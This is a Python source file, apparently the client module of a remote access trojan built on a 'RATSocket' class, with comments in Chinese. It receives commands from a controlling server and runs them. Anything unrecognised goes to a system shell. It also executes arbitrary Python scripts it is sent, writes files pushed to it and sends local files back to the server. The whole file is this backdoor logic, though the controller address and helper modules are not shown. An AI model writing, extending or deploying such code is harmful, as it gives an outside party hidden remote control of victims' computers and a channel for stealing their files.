import inspect
import ntpath
import os

from client.command import Command
from common.ratsocket import RATSocket
from common.util import logger, get_input_stream, get_output_stream, parse


class Server(RATSocket):

    def __init__(self):
        super().__init__()

    def send_result(self, id: int, status: int, result: str):
        """
        向服务端发送结果
        :param id: 与命令id对应
        :param status: 0或1
        :param result: 结果
        """
        data = {
            'type': 'result',
            'id': id,
            'status': status,
            'text': result,
            'cwd': os.getcwd()
        }
        logger.info(data)
        self.send(data)

    def send_file(self, id: int, filename: str):
        """
        向服务端发送文件
        :param id: 与命令id对应
        :param filename: 文件名
        """
        data = {
            'type': 'file',
            'id': id,
            'length': os.stat(filename).st_size,
            'filename': ntpath.basename(filename),
            'cwd': os.getcwd(),
        }
        io = get_output_stream(filename)
        self.send(data)
        if self.recv_signal():
            self.send_io(io)

    def recv_command(self) -> (int, int, str):
        """
        从服务端接收命令并在本地执行
        :return: 结果id，状态，结果
        """
        data = self.recv()
        logger.info(data)
        id = data['id']
        type = data['type']
        try:
            # 如果是命令
            if type == 'command':
                command = data['text']
                name, arg = parse(command)
                if hasattr(Command, name):
                    func = getattr(Command, name)
                    params = inspect.getfullargspec(func).args
                    if not len(params):
                        result = func()
                    else:
                        if '_instance' in params:
                            if len(params) == 1:
                                result = func(_instance=(id, self))
                            else:
                                result = func(arg, _instance=(id, self))
                        else:
                            result = func(arg)
                    if result:
                        result = result[0], result[1] + '\n'
                else:
                    result = Command.shell(command)
                if result:
                    return id, *result
            # 如果是Python脚本
            if type == 'script':
                return id, *Command.pyexec(data['text'], kwargs=data.get('extra'))
            # 如果是文件
            elif type == 'file':
                filename = os.path.abspath(data['filename'])
                try:
                    io = get_input_stream(filename)
                except Exception as e:
                    self.send_signal(0)
                    return id, 0, str(e)
                try:
                    self.send_signal(1)
                    self.recv_io(data['length'], io)
                    return id, 1, f'File uploaded to: {os.path.abspath(filename)}'
                except Exception as e:
                    logger.error(f'Error receiving file from server: {e}')
        except Exception as e:
            logger.error(e, exc_info=True)
            return id, 0, f'{e}\n'
